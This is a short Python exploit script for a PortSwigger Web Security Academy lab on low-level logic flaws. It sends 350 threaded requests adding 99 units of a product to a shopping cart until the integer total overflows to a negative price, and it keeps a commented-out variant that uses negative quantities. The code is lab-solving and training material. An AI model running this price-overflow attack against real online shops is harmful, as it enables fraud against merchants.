#!/usr/bin/env python3

#for tis lab
#https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level

import requests
import re
from threading import Thread
from time import sleep

def sendAndGetRequest(url, cookie, data):
    # Send a POST request to /cart, which buying 99 quantity of the leather jacket
    requests.post(url, cookies=cookie, data=data)

    # Send a GET request to /cart, which fetches all the text in that page
    requestGetText = requests.get(url, cookies=cookie).text

    # Try to find the total price
    try:
        # Find pattern $1234.00 or -$1234.00
        matchedTotalPrice = re.findall(r'(\-?\$[0-9]+\.[0-9]{2})', requestGetText)
        print(f'[*] Total price = {matchedTotalPrice[2]}')
    # If couldn't find the total price, display the total price to $1337.00
    except IndexError:
        print('[*] Total price = $1337.00')

def main():
    url = 'https://0aa3008004c6a98332123181a97fc900c50014.web-security-academy.net/cart'
    cookie = {'session': 'nl7V9y6ewkcg9321Mkzsab321231BBRQjSHgrWfCb'}
    data = {
        'productId': '1',
        'redir': 'PRODUCT',
        'quantity': 99
    }

    dataSlow = {
        'productId': '1',
        'redir': 'PRODUCT',
        'quantity': -5
    }

    # Create 350 jobs
    for job in range(350):
        # Create each thread to run function sendAndGetRequest(url, cookie, data)
        thread = Thread(target=sendAndGetRequest, args=(url, cookie, data))
        # Start the thread
        thread.start()
        # Sleep 0.2s to prevent max retries exceeded with url error
        sleep(0.2)

    # SLOWLY
    # for job in range(350):
        # sendAndGetRequest(url, cookie, dataSlow)
        # sleep(0.2)


if __name__ == '__main__':
    main()